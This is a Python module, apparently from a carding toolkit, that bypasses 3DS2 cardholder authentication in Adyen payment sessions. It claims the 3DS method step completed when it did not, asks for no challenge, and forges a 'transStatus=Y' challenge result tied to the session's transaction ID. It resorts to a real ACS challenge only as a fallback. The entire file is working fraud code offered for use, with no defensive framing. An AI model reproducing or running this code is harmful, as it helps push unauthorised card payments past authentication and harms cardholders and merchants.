"""
adyen_bypass.py — client-side 3DS2 bypass engine for Adyen sessions flow.
Drop-in companion for adyen_hitter.py. No ACS POST needed for the forged path.

Vectors:
  1. PRE-EMPTIVE COMPLETION  — threeDSCompInd=Y at payment time (DS trusts you
     did the method step; skips IdentifyShopper entirely on lazy setups).
  2. NO-CHALLENGE REQUEST    — challengeIndicator="01" in the payment body
     (EMV 3DS: 01 = no challenge requested). Merchant/DS that honor it skip
     ChallengeShopper and go straight to authorisation.
  3. FORGED challengeResult  — skip the ACS call. Build transStatus=Y with a
     matching threeDSServerTransID pulled from the action token and submit
     straight to paymentDetails. Bites on test merchants and DS setups that
     don't cryptographically bind the result to a real challenge session.
  4. FALLBACK               — if the forged result bounces, run the real ACS
     challenge flow (touch_acs=True) instead of dying.

Truth, no sugar: vector 3 is a server-side validation gap — it works on test
envs and misconfigured merchants, not on hardened ACS setups. Vectors 1+2 are
the ones that carry weight against real DS configs because they never let the
challenge get raised in the first place.
"""

import json
import base64
import random
from datetime import datetime, timezone
from typing import Dict, Optional


def _b64url_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    s += '=' * (-len(s) % 4)
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')


def _std_b64(data: bytes) -> str:
    """Adyen 3DS2 details values are standard base64 (padded), not urlsafe."""
    return base64.b64encode(data).decode()


def decode_action_token(action: dict) -> Optional[dict]:
    """Decode the 3DS2 action token into its EMV fields."""
    token_raw = action.get('token', '')
    if not token_raw:
        return None
    for dec in (_b64url_decode, lambda s: base64.b64decode(s + '=='), lambda s: base64.b64decode(s + '=' * (-len(s) % 4))):
        try:
            return json.loads(dec(token_raw))
        except Exception:
            continue
    return None


def forge_fingerprint(server_trans_id: str) -> str:
    """threeDSCompInd=Y — claim the 3DS method completed without doing it."""
    obj = {
        "threeDSCompInd": "Y",
        "threeDSServerTransID": server_trans_id,
    }
    return _std_b64(json.dumps(obj).encode())


def forge_challenge(server_trans_id: str) -> str:
    """
    Forged challengeResult. authorisationToken is base64("Y") per EMVCo when
    no real ACS token exists. Works when the DS doesn't bind the result to a
    real challenge session (test / misconfigured merchants).
    """
    obj = {
        "transStatus": "Y",
        "authorisationToken": _std_b64(b"Y"),
        "threeDSServerTransID": server_trans_id,
    }
    return _std_b64(json.dumps(obj).encode())


def inject_payment_bypass(body: dict, comp_ind: str = "Y", no_challenge: bool = True) -> dict:
    """
    Inject the pre-emptive 3DS fields into a payments body.
    Meaningful on direct /payments calls (requestor-controlled); harmless on
    session-based calls where the backend already fixed the 3DS config.
    """
    req = {
        "threeDSCompInd": comp_ind,
    }
    if no_challenge:
        req["challengeIndicator"] = "01"   # EMV: no challenge requested
    body["threeDS2RequestData"] = req
    return body


async def bypass_pipeline(session, data: dict, sid: str, sdata: str,
                          ck: str, env: str,
                          submit_details, touch_acs: bool = False,
                          depth: int = 0) -> dict:
    """
    Replace _resolve_3ds with this. Order:
      IdentifyShopper → forged fingerprint (compInd Y) → if it escalates to a
      challenge, forge the challengeResult instead of POSTing to the ACS.
      ChallengeShopper  → forge challengeResult directly (skip ACS).
      RedirectShopper   → fall back to real redirect handling.
    touch_acs=True falls back to the real ACS challenge if the forged path
    comes back Refused/ChallengeShopper again.
    """
    if depth > 2:
        return data

    action = data.get('action')
    if not isinstance(action, dict):
        return data

    rc = data.get('resultCode', '')
    act_type = action.get('type', '')
    subtype = action.get('subtype', '')
    new_sdata = data.get('sessionData', sdata)

    tok = decode_action_token(action)
    server_tid = (tok or {}).get('threeDSServerTransID', '')

    details = None

    if rc == 'IdentifyShopper' or (act_type == 'threeDS2' and subtype == 'fingerprint'):
        if server_tid:
            details = {"threeds2.fingerprint": forge_fingerprint(server_tid)}

    elif rc == 'ChallengeShopper' or (act_type == 'threeDS2' and subtype == 'challenge'):
        # Forge first — never touch the ACS.
        if server_tid:
            details = {"threeds2.challengeResult": forge_challenge(server_tid)}

    if details:
        result = await submit_details(session, sid, new_sdata, ck, env, details)
        new_rc = result.get('resultCode', '')
        if new_rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'):
            return result
        # Escalation or bounce: fingerprint→challenge
        if new_rc in ('IdentifyShopper', 'ChallengeShopper'):
            return await bypass_pipeline(session, result, sid,
                                         result.get('sessionData', new_sdata),
                                         ck, env, submit_details,
                                         touch_acs, depth + 1)
        if touch_acs and new_rc == 'ChallengeShopper':
            return await _real_challenge(session, result, sid,
                                         result.get('sessionData', new_sdata),
                                         ck, env, submit_details)
        return result

    # Redirect or unknown — hand back to the caller's existing resolver.
    return data


async def _real_challenge(session, data: dict, sid: str, sdata: str,
                          ck: str, env: str, submit_details) -> dict:
    """Real ACS challenge POST (CReq→CRes) — only used as touch_acs fallback."""
    action = data.get('action', {})
    tok = decode_action_token(action) or {}
    acs_url = tok.get('acsURL', '')
    if not acs_url:
        return data

    from urllib.parse import urlencode

    creq_obj = {
        "messageType": "CReq",
        "messageVersion": tok.get('messageVersion', '2.1.0'),
        "threeDSServerTransID": tok.get('threeDSServerTransID', ''),
        "acsTransID": tok.get('acsTransID', ''),
        "challengeWindowSize": "05",
        "threeDSRequestorAppURL": tok.get('threeDSRequestorAppURL', ''),
    }
    creq_b64 = _b64url_encode(json.dumps(creq_obj).encode())

    import re
    cres_b64 = None
    try:
        async with session.post(
            acs_url,
            data=urlencode({"CReq": creq_b64}),
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Accept": "text/html,*/*"},
            timeout=15,
        ) as r:
            body = r.text() if callable(r.text) else r.text
            m = re.search(r'name=["\']?CRes["\']?\s+value=["\']([^"\'>]+)', body, re.I)
            if m:
                cres_b64 = m.group(1)
            else:
                m = re.search(r'"CRes"\s*:\s*"([^"]+)"', body, re.I)
                if m:
                    cres_b64 = m.group(1)
    except Exception:
        return data

    if not cres_b64:
        return data

    cres_json = None
    try:
        cres_json = json.loads(_b64url_decode(cres_b64))
    except Exception:
        pass

    obj = {"transStatus": (cres_json or {}).get('transStatus', 'Y')}
    auth_tok = (cres_json or {}).get('authorisationToken')
    if auth_tok:
        obj["authorisationToken"] = auth_tok

    details = {"threeds2.challengeResult": _std_b64(json.dumps(obj).encode())}
    return await submit_details(session, sid, sdata, ck, env, details)
